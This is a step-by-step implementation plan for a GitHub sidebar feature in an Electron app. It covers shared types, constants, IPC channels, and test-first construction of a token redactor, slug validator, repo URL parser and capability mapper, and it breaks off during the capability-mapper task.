# GitHub Sidebar Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a collapsible right-side panel that surfaces GitHub data + session-aware interpretation per Claude Code terminal session, including auth (gh CLI / OAuth / PAT), config UI, rate-limited GitHub client, and 8 panel sections.

**Architecture:** Three-tier auth producing one `AuthProfile` abstraction; main-process-only token handling via `safeStorage`; capability-routed GitHub client with ETag cache, per-bucket rate-limit shield, GraphQL→REST fallback; cache persists to `github-cache.json` with LRU eviction and corruption recovery; renderer consumes via IPC + Zustand store; panel sections composed from a shared `SectionFrame`.

**Tech Stack:** Electron 33 + React 18 + TypeScript; Zustand 5; Node built-in `fetch`; `marked` + `isomorphic-dompurify` for sanitization; existing Tailwind v4 theme; vitest + Playwright.

**Spec reference:** `docs/superpowers/specs/2026-04-17-github-sidebar-design.md` (rev 3, `b765a28` on beta).

**Branch:** `feature/github-sidebar` off `beta`. PR target: `beta`.

---

## File Structure Map

### Shared (`src/shared/`)

| File | Responsibility | Status |
|---|---|---|
| `github-types.ts` | Types: `AuthProfile`, `Capability`, `GitHubConfig`, `GitHubCache`, `RepoCache`, `PRSnapshot`, etc. | CREATE |
| `github-constants.ts` | Public OAuth Client ID, API base URL, GitHub owner/repo regexes, scope→capability mapping | CREATE |
| `ipc-channels.ts` | Add `GITHUB_*` channel constants | MODIFY |
| `types.ts` | Extend `SessionConfig` with `githubIntegration` field | MODIFY |

### Main Process (`src/main/`)

#### Security infrastructure
| File | Responsibility | Status |
|---|---|---|
| `github/security/token-redactor.ts` | Regex-based log-line redaction for token prefixes | CREATE |
| `github/security/slug-validator.ts` | Validate owner/repo slugs per GitHub rules | CREATE |
| `github/security/repo-url-parser.ts` | Parse git remote URLs → `owner/repo` | CREATE |

#### Auth
| File | Responsibility | Status |
|---|---|---|
| `github/auth/auth-profile-store.ts` | Load/save profiles to `github-config.json` via `safeStorage` | CREATE |
| `github/auth/capability-mapper.ts` | Scope array → `Capability[]` derivation per kind | CREATE |
| `github/auth/gh-cli-delegate.ts` | `gh auth status` parser + `gh auth token --user X` invocation | CREATE |
| `github/auth/oauth-device-flow.ts` | Device code POST + polling | CREATE |
| `github/auth/pat-verifier.ts` | Verify PATs via `/user`, probe allowedRepos via `/repos/{owner}/{repo}` | CREATE |

#### GitHub client
| File | Responsibility | Status |
|---|---|---|
| `github/client/rate-limit-shield.ts` | Per-bucket rate limit tracking, pause logic | CREATE |
| `github/client/etag-cache.ts` | Per-endpoint ETag get/set | CREATE |
| `github/client/github-fetch.ts` | Authenticated fetch wrapper (capability routing, retries, redaction) | CREATE |
| `github/client/graphql-queries.ts` | PR-card GraphQL query + types | CREATE |
| `github/client/rest-fallback.ts` | REST equivalents of the GraphQL PR query | CREATE |

#### Cache
| File | Responsibility | Status |
|---|---|---|
| `github/cache/cache-store.ts` | `github-cache.json` R/W, LRU eviction, corruption recovery, backup retention | CREATE |

#### Session integration
| File | Responsibility | Status |
|---|---|---|
| `github/session/repo-detector.ts` | `git remote get-url origin` (local + SSH), parse, return slug | CREATE |
| `github/session/tool-call-inspector.ts` | Read JSONL transcript tool calls, narrow allowlist | CREATE |
| `github/session/transcript-scanner.ts` | Opt-in scan of last 50 user/assistant messages for `#NNN` / URLs | CREATE |
| `github/session/sync-orchestrator.ts` | Tiered sync intervals; active/background/notifications | CREATE |

#### Config manager + IPC
| File | Responsibility | Status |
|---|---|---|
| `github/github-config-store.ts` | `github-config.json` load/save with schemaVersion | CREATE |
| `ipc/github-handlers.ts` | All GitHub IPC handlers | CREATE |
| `index.ts` | Register the handlers, init auto-detect on session create | MODIFY |

### Preload (`src/preload/index.ts`)

| Responsibility | Status |
|---|---|
| Expose `github.*` namespace | MODIFY |

### Renderer (`src/renderer/`)

| File | Responsibility | Status |
|---|---|---|
| `types/electron.d.ts` | `window.electron.github` type declarations | MODIFY |
| `stores/githubStore.ts` | Zustand store: profiles, config, per-session state, cache mirror, actions | CREATE |
| `utils/markdownSanitizer.ts` | `marked` + `DOMPurify` allowlisted pipeline | CREATE |
| `utils/relativeTime.ts` | "Xs ago" formatter (only if not already present) | CREATE |
| `components/github/GitHubPanel.tsx` | Panel shell (width, collapse, rail) | CREATE |
| `components/github/PanelHeader.tsx` | Branch chip + ahead/behind + dirty count + sync indicator | CREATE |
| `components/github/SectionFrame.tsx` | Reusable collapsible section | CREATE |
| `components/github/sections/LocalGitSection.tsx` | Local git state | CREATE |
| `components/github/sections/SessionContextSection.tsx` | Primary issue + recent files + active PR | CREATE |
| `components/github/sections/ActivePRSection.tsx` | Full PR card | CREATE |
| `components/github/sections/CISection.tsx` | Workflow runs | CREATE |
| `components/github/sections/ReviewsSection.tsx` | Review threads (sanitized markdown) | CREATE |
| `components/github/sections/IssuesSection.tsx` | Linked issues list | CREATE |
| `components/github/sections/NotificationsSection.tsx` | Notifications inbox | CREATE |
| `components/github/sections/AgentIntentSection.tsx` | Deferred — stub | CREATE |
| `components/github/config/GitHubConfigTab.tsx` | Config page tab | CREATE |
| `components/github/config/AuthProfilesList.tsx` | Profile cards + actions | CREATE |
| `components/github/config/AddProfileModal.tsx` | OAuth sign-in + PAT paste forms | CREATE |
| `components/github/config/FeatureTogglesList.tsx` | Feature toggles with availability state | CREATE |
| `components/github/config/PermissionsSummary.tsx` | Live-updated "you need these scopes" panel | CREATE |
| `components/github/config/PrivacySettings.tsx` | Transcript scanning toggle | CREATE |
| `components/github/config/SyncSettings.tsx` | Interval dropdowns | CREATE |
| `components/github/onboarding/OnboardingModal.tsx` | Post-update modal | CREATE |
| `components/session/SessionGitHubConfig.tsx` | Per-session settings panel | CREATE |
| `components/sidebar/SidebarNav.tsx` | Add panel toggle button | MODIFY |
| `App.tsx` | Route config tab, mount panel, init listeners | MODIFY |

### Tests
| Dir | Files | Status |
|---|---|---|
| `tests/unit/github/` | one per unit module above | CREATE |
| `tests/e2e/github-panel.spec.ts` | End-to-end panel states | CREATE |
| `tests/e2e/github-auth.spec.ts` | OAuth device flow with stubbed endpoints | CREATE |

### Dependencies (`package.json`)
| Package | Purpose |
|---|---|
| `marked` (^12) | Markdown → HTML |
| `isomorphic-dompurify` (^2) | HTML sanitizer (SSR/main-process compatible variant of DOMPurify) |

---

## Global Conventions (apply across tasks)

- **Imports:** no default exports except React components that are the sole export of their file.
- **Never import Node modules in renderer** — all filesystem/network via IPC.
- **Unicode:** never `\u{...}` in JSX; use `String.fromCodePoint()` or SVG.
- **Commits:** after every passing test group. Commit message prefix: `feat(github):`, `test(github):`, `refactor(github):`, `chore(github):`, `docs(github):`.
- **TDD loop for every task:** (1) write failing test → (2) `npx vitest run <path>` → expect FAIL → (3) minimal implementation → (4) re-run → expect PASS → (5) commit.
- **Run `npm run typecheck` before every commit** in tasks that modify shared types.

---

## Pre-Task: Branch setup & dependencies

### Task 0.1: Create feature branch + install deps

**Files:** `package.json`, `package-lock.json`

- [ ] **Step 1: Confirm on beta and clean**

```bash
cd F:/CLAUDE_MULTI_APP
git status
git branch --show-current
```

Expected output: `On branch beta`, `nothing to commit, working tree clean`.

- [ ] **Step 2: Create feature branch**

```bash
git checkout -b feature/github-sidebar
```

Expected: `Switched to a new branch 'feature/github-sidebar'`.

- [ ] **Step 3: Install dependencies**

```bash
npm install marked@^12 isomorphic-dompurify@^2
```

Expected: successful install; `package.json` and `package-lock.json` updated.

- [ ] **Step 4: Commit**

```bash
git add package.json package-lock.json
git commit -m "chore(github): add marked + isomorphic-dompurify deps"
```

---

## Phase A — Foundations: Types, IPC Channels, Security Primitives

### Task A1: Create shared GitHub types

**Files:** Create `src/shared/github-types.ts`.

- [ ] **Step 1: Create the file with all types**

```ts
// src/shared/github-types.ts

export type Capability =
  | 'pulls'
  | 'issues'
  | 'contents'
  | 'statuses'
  | 'checks'
  | 'actions'
  | 'notifications'

export type GitHubFeatureKey =
  | 'activePR'
  | 'ci'
  | 'reviews'
  | 'linkedIssues'
  | 'notifications'
  | 'localGit'
  | 'sessionContext'

export interface RateLimitSnapshot {
  limit: number
  remaining: number
  resetAt: number
  capturedAt: number
}

export interface AuthProfile {
  id: string
  kind: 'gh-cli' | 'oauth' | 'pat-classic' | 'pat-fine-grained'
  label: string
  username: string
  avatarUrl?: string
  scopes: string[]
  capabilities: Capability[]
  allowedRepos?: string[]
  tokenCiphertext?: string
  ghCliUsername?: string
  createdAt: number
  lastVerifiedAt: number
  lastAuthErrorAt?: number
  expiresAt?: number
  expiryObservable: boolean
  rateLimits?: {
    core?: RateLimitSnapshot
    search?: RateLimitSnapshot
    graphql?: RateLimitSnapshot
  }
}

export interface GitHubSyncIntervals {
  activeSessionSec: number
  backgroundSec: number
  notificationsSec: number
}

export interface GitHubConfig {
  schemaVersion: number
  authProfiles: Record<string, AuthProfile>
  defaultAuthProfileId?: string
  featureToggles: Record<GitHubFeatureKey, boolean>
  syncIntervals: GitHubSyncIntervals
  enabledByDefault: boolean
  transcriptScanningOptIn: boolean
  seenOnboardingVersion?: string
}

export interface SessionGitHubIntegration {
  enabled: boolean
  repoUrl?: string
  repoSlug?: string
  authProfileId?: string
  autoDetected: boolean
  panelWidth?: number
  collapsedSections?: Record<string, boolean>
  dismissedAutoDetect?: boolean
}

// Cache
export interface NotificationSummary {
  id: string
  type: 'review_requested' | 'mention' | 'assign' | 'subscribed' | string
  repo: string
  title: string
  url: string
  unread: boolean
  updatedAt: number
}

export interface NotificationsCache {
  etag?: string
  lastFetched: number
  items: NotificationSummary[]
}

export interface PRSnapshot {
  number: number
  title: string
  state: 'open' | 'closed' | 'merged'
  draft: boolean
  author: string
  authorAvatarUrl?: string
  createdAt: number
  updatedAt: number
  mergeableState: 'clean' | 'conflict' | 'blocked' | 'unknown'
  allowedMergeMethods?: Array<'merge' | 'squash' | 'rebase'>
  url: string
}

export interface WorkflowRunSnapshot {
  id: number
  workflowName: string
  status: 'queued' | 'in_progress' | 'completed'
  conclusion?: 'success' | 'failure' | 'cancelled' | 'skipped' | null
  durationMs?: number
  url: string
  failedJobs?: Array<{ id: number; name: string; tailLine?: string }>
}

export interface ReviewSnapshot {
  id: number
  reviewer: string
  reviewerAvatarUrl?: string
  state: 'APPROVED' | 'CHANGES_REQUESTED' | 'COMMENTED' | 'PENDING' | 'DISMISSED'
  threads: Array<{
    id: string
    file: string
    line: number
    commenter: string
    bodyMarkdown: string
    resolved: boolean
  }>
}

export interface IssueSnapshot {
  number: number
  title: string
  state: 'open' | 'closed'
  assignee?: string
  url: string
  primary?: boolean
}

export interface StatusSnapshot {
  context: string
  state: 'success' | 'failure' | 'pending' | 'error'
  description?: string
  url?: string
}

export interface CheckRunSnapshot {
  id: number
  name: string
  status: 'queued' | 'in_progress' | 'completed'
  conclusion?: 'success' | 'failure' | 'neutral' | 'cancelled' | 'skipped' | 'timed_out' | 'action_required' | null
  detailsUrl?: string
}

export interface RepoCache {
  etags: Record<string, string>
  lastSynced: number
  pr?: PRSnapshot
  actions?: WorkflowRunSnapshot[]
  reviews?: ReviewSnapshot[]
  issues?: IssueSnapshot[]
  statuses?: StatusSnapshot[]
  checks?: CheckRunSnapshot[]
  accessedAt: number
}

export interface GitHubCache {
  schemaVersion: number
  repos: Record<string, RepoCache>
  notificationsByProfile: Record<string, NotificationsCache>
  lru: string[]
}

// Session context signals
export interface ToolCallFileSignal {
  filePath: string
  at: number
  tool: 'Read' | 'Write' | 'Edit' | 'NotebookEdit' | 'MultiEdit' | 'Bash'
}

export interface TranscriptReference {
  kind: 'issue' | 'pr'
  repo?: string  // "owner/repo" if full URL; undefined for bare #NNN (resolves to session repo)
  number: number
  at: number
}

export interface SessionContextSignals {
  branchRefs: number[]       // numbers extracted from branch name
  transcriptRefs: TranscriptReference[]
  recentFiles: ToolCallFileSignal[]
}

// Device flow types
export interface DeviceCodeResponse {
  device_code: string
  user_code: string
  verification_uri: string
  expires_in: number
  interval: number
}

export interface OAuthTokenResponse {
  access_token?: string
  token_type?: string
  scope?: string
  error?: 'authorization_pending' | 'slow_down' | 'expired_token' | 'access_denied' | string
  error_description?: string
  interval?: number
}
```

- [ ] **Step 2: Verify typecheck passes**

Run: `npm run typecheck`
Expected: no errors.

- [ ] **Step 3: Commit**

```bash
git add src/shared/github-types.ts
git commit -m "feat(github): add shared GitHub types"
```

---

### Task A2: Add GitHub constants

**Files:** Create `src/shared/github-constants.ts`.

- [ ] **Step 1: Create constants file**

```ts
// src/shared/github-constants.ts
import type { Capability } from './github-types'

// PUBLIC OAUTH CLIENT ID — safe to commit. RFC 8628 device flow = public client,
// no client secret needed. Do NOT add a client secret here.
export const GITHUB_OAUTH_CLIENT_ID = 'Ov23liOJO5KaUDD9D1bY'

export const GITHUB_API_BASE = 'https://api.github.com'
export const GITHUB_DEVICE_CODE_URL = 'https://github.com/login/device/code'
export const GITHUB_OAUTH_TOKEN_URL = 'https://github.com/login/oauth/access_token'
export const GITHUB_DEVICE_VERIFICATION_URL = 'https://github.com/login/device'

// GitHub's real owner/repo naming rules
export const GITHUB_OWNER_REGEX = /^[A-Za-z0-9](?:[A-Za-z0-9]|-(?=[A-Za-z0-9])){0,38}$/
export const GITHUB_REPO_NAME_REGEX = /^[A-Za-z0-9._-]+$/

// Session Context: branch name → issue number detection
export const BRANCH_ISSUE_REGEXES: RegExp[] = [
  /^(?:fix|feat|feature|issue|chore|bug)[-_/](\d+)/,
  /^(\d+)[-_]/,
]

// Transcript scanner patterns
export const TRANSCRIPT_ISSUE_REGEX = /#(\d+)\b/g
export const TRANSCRIPT_GH_REGEX = /\bGH-(\d+)\b/g
export const TRANSCRIPT_URL_REGEX = /https?:\/\/github\.com\/([A-Za-z0-9-]+)\/([A-Za-z0-9._-]+)\/(?:issues|pull)\/(\d+)/g

// Token redactor patterns (apply before any log write)
export const TOKEN_REDACTION_PATTERNS: RegExp[] = [
  /\bghp_[A-Za-z0-9]+\b/g,
  /\bgithub_pat_[A-Za-z0-9_]+\b/g,
  /\bgho_[A-Za-z0-9]+\b/g,
  /\bghu_[A-Za-z0-9]+\b/g,
  /\bghs_[A-Za-z0-9]+\b/g,
  /\bghr_[A-Za-z0-9]+\b/g,
  /\bghi_[A-Za-z0-9]+\b/g,
  /access_token=[^&\s]+/g,
]

// Default sync intervals (seconds)
export const DEFAULT_SYNC_INTERVALS = {
  activeSessionSec: 60,
  backgroundSec: 300,
  notificationsSec: 180,
}

export const DEFAULT_FEATURE_TOGGLES = {
  activePR: true,
  ci: true,
  reviews: true,
  linkedIssues: true,
  notifications: false,  // requires extra auth
  localGit: true,
  sessionContext: true,
}

// OAuth scopes per repo-visibility mode
export const OAUTH_SCOPES_PUBLIC = 'public_repo read:org notifications workflow'
export const OAUTH_SCOPES_PRIVATE = 'repo read:org notifications workflow'

// Scope → Capability mapping
export const CLASSIC_PAT_SCOPE_CAPABILITIES: Record<string, Capability[]> = {
  repo: ['pulls', 'issues', 'contents', 'statuses', 'checks', 'actions'],
  public_repo: ['pulls', 'issues', 'contents', 'statuses', 'checks', 'actions'],
  workflow: ['actions'],
  notifications: ['notifications'],
}

// Fine-grained permission → Capability mapping
export const FINEGRAINED_PERMISSION_CAPABILITIES: Record<string, Capability[]> = {
  pull_requests: ['pulls'],
  issues: ['issues'],
  contents: ['contents'],
  statuses: ['statuses'],
  actions: ['actions'],
  // checks intentionally NOT in fine-grained
  // notifications intentionally NOT in fine-grained
}

export const GITHUB_CONFIG_SCHEMA_VERSION = 1
export const GITHUB_CACHE_SCHEMA_VERSION = 1

export const CACHE_MAX_REPOS = 50
export const CACHE_MAX_BYTES = 10 * 1024 * 1024
export const CACHE_CORRUPT_BACKUPS_KEEP = 3
```

- [ ] **Step 2: Verify typecheck passes**

Run: `npm run typecheck`
Expected: no errors.

- [ ] **Step 3: Commit**

```bash
git add src/shared/github-constants.ts
git commit -m "feat(github): add shared GitHub constants (OAuth client ID, regexes, capability maps)"
```

---

### Task A3: Extend IPC channels

**Files:** `src/shared/ipc-channels.ts` (modify).

- [ ] **Step 1: Add GitHub channel constants**

Append to `src/shared/ipc-channels.ts` (before the `export const IPC_CHANNELS` object if one exists, or inside if it's a single object):

```ts
// GitHub sidebar channels
export const GITHUB_CONFIG_GET = 'github:config:get'
export const GITHUB_CONFIG_UPDATE = 'github:config:update'
export const GITHUB_PROFILE_ADD_PAT = 'github:profile:addPat'
export const GITHUB_PROFILE_REMOVE = 'github:profile:remove'
export const GITHUB_PROFILE_RENAME = 'github:profile:rename'
export const GITHUB_PROFILE_TEST = 'github:profile:test'
export const GITHUB_OAUTH_START = 'github:oauth:start'
export const GITHUB_OAUTH_POLL = 'github:oauth:poll'
export const GITHUB_OAUTH_CANCEL = 'github:oauth:cancel'
export const GITHUB_GHCLI_DETECT = 'github:ghcli:detect'
export const GITHUB_REPO_DETECT = 'github:repo:detect'
export const GITHUB_SESSION_CONFIG_UPDATE = 'github:session:updateConfig'
export const GITHUB_SYNC_NOW = 'github:sync:now'
export const GITHUB_SYNC_PAUSE = 'github:sync:pause'
export const GITHUB_SYNC_RESUME = 'github:sync:resume'
export const GITHUB_DATA_GET = 'github:data:get'           // fetch cache snapshot for a repo
export const GITHUB_DATA_UPDATE = 'github:data:update'     // push from main → renderer
export const GITHUB_SESSION_CONTEXT_GET = 'github:session:context:get'
export const GITHUB_ACTIONS_RERUN = 'github:actions:rerun'
export const GITHUB_PR_MERGE = 'github:pr:merge'
export const GITHUB_PR_READY = 'github:pr:ready'
export const GITHUB_REVIEW_REPLY = 'github:review:reply'
export const GITHUB_NOTIF_MARK_READ = 'github:notif:markRead'
```

- [ ] **Step 2: Verify typecheck passes**

Run: `npm run typecheck`
Expected: no errors.

- [ ] **Step 3: Commit**

```bash
git add src/shared/ipc-channels.ts
git commit -m "feat(github): add GitHub IPC channel constants"
```

---

### Task A4: Extend SessionConfig type

**Files:** `src/shared/types.ts` (modify).

- [ ] **Step 1: Find the SessionConfig type definition**

Run: `grep -n "SessionConfig" F:/CLAUDE_MULTI_APP/src/shared/types.ts` — note the interface location.

- [ ] **Step 2: Add githubIntegration field**

Append to the `SessionConfig` interface (inside the closing `}`):

```ts
  githubIntegration?: import('./github-types').SessionGitHubIntegration
```

- [ ] **Step 3: Verify typecheck**

Run: `npm run typecheck`
Expected: no errors (existing code doesn't reference this optional field).

- [ ] **Step 4: Commit**

```bash
git add src/shared/types.ts
git commit -m "feat(github): extend SessionConfig with githubIntegration field"
```

---

### Task A5: Token redactor + unit tests

**Files:** Create `src/main/github/security/token-redactor.ts`, `tests/unit/github/token-redactor.test.ts`.

- [ ] **Step 1: Write the failing test**

Create `tests/unit/github/token-redactor.test.ts`:

```ts
import { describe, it, expect } from 'vitest'
import { redactTokens } from '../../../src/main/github/security/token-redactor'

describe('redactTokens', () => {
  it('redacts classic PAT (ghp_)', () => {
    const input = 'authorization: token ghp_abc123XYZdef456'
    expect(redactTokens(input)).toBe('authorization: token [REDACTED]')
  })
  it('redacts fine-grained PAT (github_pat_)', () => {
    const input = 'github_pat_ABC_123xyz'
    expect(redactTokens(input)).toBe('[REDACTED]')
  })
  it('redacts OAuth user token (gho_)', () => {
    expect(redactTokens('gho_xyz789')).toBe('[REDACTED]')
  })
  it('redacts ghu_, ghs_, ghr_, ghi_', () => {
    expect(redactTokens('ghu_1 ghs_2 ghr_3 ghi_4')).toBe('[REDACTED] [REDACTED] [REDACTED] [REDACTED]')
  })
  it('redacts access_token URL param', () => {
    expect(redactTokens('https://x?access_token=sensitive&other=ok')).toBe('https://x?[REDACTED]&other=ok')
  })
  it('does NOT redact the public Client ID', () => {
    expect(redactTokens('client_id=Ov23liOJO5KaUDD9D1bY')).toBe('client_id=Ov23liOJO5KaUDD9D1bY')
  })
  it('leaves non-token text alone', () => {
    expect(redactTokens('normal log line')).toBe('normal log line')
  })
  it('handles mixed content', () => {
    expect(redactTokens('Bearer ghp_SECRET and client_id=Ov23liOJO5KaUDD9D1bY'))
      .toBe('Bearer [REDACTED] and client_id=Ov23liOJO5KaUDD9D1bY')
  })
})
```

- [ ] **Step 2: Run test — expect fail**

Run: `npx vitest run tests/unit/github/token-redactor.test.ts`
Expected: FAIL (module not found).

- [ ] **Step 3: Create `src/main/github/security/token-redactor.ts`**

```ts
import { TOKEN_REDACTION_PATTERNS } from '../../../shared/github-constants'

export function redactTokens(line: string): string {
  let out = line
  for (const pattern of TOKEN_REDACTION_PATTERNS) {
    out = out.replace(pattern, '[REDACTED]')
  }
  return out
}

export function wrapLogger<T extends (...args: any[]) => void>(logFn: T): T {
  return ((...args: any[]) => {
    const redacted = args.map((a) =>
      typeof a === 'string' ? redactTokens(a) : a,
    )
    logFn(...redacted)
  }) as T
}
```

- [ ] **Step 4: Run test — expect pass**

Run: `npx vitest run tests/unit/github/token-redactor.test.ts`
Expected: PASS all 8 tests.

- [ ] **Step 5: Commit**

```bash
git add src/main/github/security/token-redactor.ts tests/unit/github/token-redactor.test.ts
git commit -m "feat(github): add token redactor with coverage tests"
```

---

### Task A6: Slug validator + unit tests

**Files:** Create `src/main/github/security/slug-validator.ts`, `tests/unit/github/slug-validator.test.ts`.

- [ ] **Step 1: Write failing test**

Create `tests/unit/github/slug-validator.test.ts`:

```ts
import { describe, it, expect } from 'vitest'
import { validateSlug, parseSlug } from '../../../src/main/github/security/slug-validator'

describe('validateSlug', () => {
  it('accepts valid slug', () => {
    expect(validateSlug('nubbymong/claude-command-center')).toBe(true)
  })
  it('accepts numeric org names', () => {
    expect(validateSlug('123/repo')).toBe(true)
  })
  it('accepts dots in repo name but not as whole name', () => {
    expect(validateSlug('owner/my.repo')).toBe(true)
    expect(validateSlug('owner/.')).toBe(false)
    expect(validateSlug('owner/..')).toBe(false)
  })
  it('rejects missing slash', () => {
    expect(validateSlug('no-slash')).toBe(false)
  })
  it('rejects multi-slash', () => {
    expect(validateSlug('a/b/c')).toBe(false)
  })
  it('rejects empty parts', () => {
    expect(validateSlug('/repo')).toBe(false)
    expect(validateSlug('owner/')).toBe(false)
  })
  it('rejects consecutive dashes in owner', () => {
    expect(validateSlug('owner--name/repo')).toBe(false)
  })
  it('rejects owner starting with dash', () => {
    expect(validateSlug('-owner/repo')).toBe(false)
  })
  it('rejects owner ending with dash', () => {
    expect(validateSlug('owner-/repo')).toBe(false)
  })
  it('rejects owner longer than 39 chars', () => {
    expect(validateSlug('a'.repeat(40) + '/repo')).toBe(false)
  })
})

describe('parseSlug', () => {
  it('splits valid slug', () => {
    expect(parseSlug('nubbymong/x')).toEqual({ owner: 'nubbymong', repo: 'x' })
  })
  it('returns null for invalid', () => {
    expect(parseSlug('invalid')).toBeNull()
  })
})
```

- [ ] **Step 2: Run — expect fail**

Run: `npx vitest run tests/unit/github/slug-validator.test.ts`
Expected: FAIL (module not found).

- [ ] **Step 3: Create implementation**

`src/main/github/security/slug-validator.ts`:

```ts
import { GITHUB_OWNER_REGEX, GITHUB_REPO_NAME_REGEX } from '../../../shared/github-constants'

export function validateSlug(slug: string): boolean {
  if (typeof slug !== 'string') return false
  const parts = slug.split('/')
  if (parts.length !== 2) return false
  const [owner, repo] = parts
  if (!owner || !repo) return false
  if (repo === '.' || repo === '..') return false
  if (!GITHUB_OWNER_REGEX.test(owner)) return false
  if (!GITHUB_REPO_NAME_REGEX.test(repo)) return false
  return true
}

export function parseSlug(slug: string): { owner: string; repo: string } | null {
  if (!validateSlug(slug)) return null
  const [owner, repo] = slug.split('/')
  return { owner, repo }
}
```

- [ ] **Step 4: Run — expect pass**

Run: `npx vitest run tests/unit/github/slug-validator.test.ts`
Expected: all 12 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/main/github/security/slug-validator.ts tests/unit/github/slug-validator.test.ts
git commit -m "feat(github): add slug validator with edge-case tests"
```

---

### Task A7: Repo URL parser + unit tests

**Files:** Create `src/main/github/security/repo-url-parser.ts`, `tests/unit/github/repo-url-parser.test.ts`.

- [ ] **Step 1: Write failing test**

`tests/unit/github/repo-url-parser.test.ts`:

```ts
import { describe, it, expect } from 'vitest'
import { parseRepoUrl } from '../../../src/main/github/security/repo-url-parser'

describe('parseRepoUrl', () => {
  it('parses HTTPS URL', () => {
    expect(parseRepoUrl('https://github.com/nubbymong/claude-command-center'))
      .toBe('nubbymong/claude-command-center')
  })
  it('parses HTTPS URL with .git', () => {
    expect(parseRepoUrl('https://github.com/nubbymong/claude-command-center.git'))
      .toBe('nubbymong/claude-command-center')
  })
  it('parses SSH URL', () => {
    expect(parseRepoUrl('git@github.com:nubbymong/claude-command-center.git'))
      .toBe('nubbymong/claude-command-center')
  })
  it('parses ssh:// URL', () => {
    expect(parseRepoUrl('ssh://git@github.com/nubbymong/claude-command-center.git'))
      .toBe('nubbymong/claude-command-center')
  })
  it('returns null for non-github host', () => {
    expect(parseRepoUrl('https://gitlab.com/a/b')).toBeNull()
    expect(parseRepoUrl('git@gitlab.com:a/b.git')).toBeNull()
  })
  it('returns null for invalid slug', () => {
    expect(parseRepoUrl('https://github.com/-bad/repo')).toBeNull()
  })
  it('returns null for empty', () => {
    expect(parseRepoUrl('')).toBeNull()
    expect(parseRepoUrl('   ')).toBeNull()
  })
  it('trims whitespace', () => {
    expect(parseRepoUrl('  https://github.com/a/b\n')).toBe('a/b')
  })
})
```

- [ ] **Step 2: Run — expect fail**

Run: `npx vitest run tests/unit/github/repo-url-parser.test.ts`
Expected: FAIL.

- [ ] **Step 3: Create implementation**

`src/main/github/security/repo-url-parser.ts`:

```ts
import { validateSlug } from './slug-validator'

export function parseRepoUrl(raw: string): string | null {
  if (typeof raw !== 'string') return null
  const s = raw.trim()
  if (!s) return null

  let slug: string | null = null

  // HTTPS: https://github.com/owner/repo[.git]
  const httpsMatch = s.match(/^https?:\/\/github\.com\/([^/\s]+)\/([^/\s]+?)(?:\.git)?$/i)
  if (httpsMatch) slug = `${httpsMatch[1]}/${httpsMatch[2]}`

  // SSH: git@github.com:owner/repo[.git]
  if (!slug) {
    const sshMatch = s.match(/^git@github\.com:([^/\s]+)\/([^/\s]+?)(?:\.git)?$/i)
    if (sshMatch) slug = `${sshMatch[1]}/${sshMatch[2]}`
  }

  // ssh://: ssh://git@github.com/owner/repo[.git]
  if (!slug) {
    const sshUrlMatch = s.match(/^ssh:\/\/git@github\.com\/([^/\s]+)\/([^/\s]+?)(?:\.git)?$/i)
    if (sshUrlMatch) slug = `${sshUrlMatch[1]}/${sshUrlMatch[2]}`
  }

  if (!slug) return null
  return validateSlug(slug) ? slug : null
}
```

- [ ] **Step 4: Run — expect pass**

Run: `npx vitest run tests/unit/github/repo-url-parser.test.ts`
Expected: all 8 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/main/github/security/repo-url-parser.ts tests/unit/github/repo-url-parser.test.ts
git commit -m "feat(github): add repo URL parser (HTTPS/SSH/ssh://, github.com only)"
```

---

## Phase B — Auth Storage & Capability Mapping

### Task B1: Capability mapper + tests

**Files:** Create `src/main/github/auth/capability-mapper.ts`, `tests/unit/github/capability-mapper.test.ts`.

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/github/capability-mapper.test.ts
import { describe, it, expect } from 'vitest'
import { scopesToCapabilities } from '../../../src/main/github/auth/capability-mapper'

describe('scopesToCapabilities', () => {
  it('maps classic repo scope to full capability set', () => {
    expect(scopesToCapabilities('classic', ['repo']).sort()).toEqual(
      ['actions', 'checks', 'contents', 'issues', 'pulls', 'statuses'].sort(),
    )
  })
  it('maps public_repo same as repo', () => {
    expect(scopesToCapabilities('classic', ['public_repo']).sort()).toEqual(
      ['actions', 'checks', 'contents', 'issues', 'pulls', 'statuses'].sort(),
    )
  })
  it('adds notifications capability from notifications scope', () => {
    expect(scopesToCapabilities('classic', ['repo', 'notifications']).includes('notifications')).toBe(true)
  })
  it('fine-grained Pull requests adds pulls', () => {
    expect(scopesToCapabilities('fine-grained', ['pull_requests']).sort()).toEqual(['pulls'])
  })
  it('fine-grained does NOT add checks even with all permissions', () => {
    const caps = scopesToCapabilities('fine-grained', [
      'pull_requests', 'issues', 'contents', 'statuses', 'actions',
    ])
    expect(caps.includes('checks')).toBe(false)
  })
  it('oauth uses same table as classic', () => {
    expect(scopesToCapabilities('oauth', ['public_repo', 'notifications']).sort()).toEqual(
      ['actions', 'checks', 'contents', 'issues', 'notifications', 'pulls', 'statuses'].sort(),
    )
  })
  it('deduplicates', () => {
    const caps = scopesToCapabilities('classic', ['repo', 'public_repo'])
    const set = new Set(caps)
    expect(caps.length).toBe(set.size)
  })
  it('returns empty for no scopes', () => {
    expect(scopesToCapabilities('classic', [])).toEqual([])
  })
})
```

- [ ] **Step 2: Run — expect fail**

Run: `npx vitest run tests/unit/github/capability-mapper.test.ts`
Expected: FAIL.

- [ ] **Step 3: Create implementation**

```ts
// src/main/github/auth/capability-mapper.ts
import type { Capability } from '../../../shared/github-types'
import {
  CLASSIC_PAT_SCOPE_CAPABILITIES,
  FINEGRAINED_PERMISSION_CAPABILITIES,
} from '../../../shared/github-constants'

export type AuthKindForMapping = 'classic' | 'fine-grained' | 'oauth' | 'gh-cli'

export function scopesToCapabilities(
  kind: AuthKindForMapping,
  scopes: string[],
): Capability[] {
  const set = new Set<Capability>()
  const table =
    kind === 'fine-grained'
      ? FINEGRAINED_PERMISSION_CAPABILITIES
      : CLASSIC_PAT_SCOPE_CAPABILITIES
  for (const s of scopes) {
    const caps = table[s]
    if (caps) caps.forEach((c) => set.add(c))
  }
  return Array.from(set)
}
```

- [ ] **Step 4: Run — expect pass**

Run: `npx vitest run tests/unit/github/capability-mapper.test.ts`
Expected: 8 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/main/github/auth/capability-mapper.ts tests/unit/github/capability-mapper.test.ts
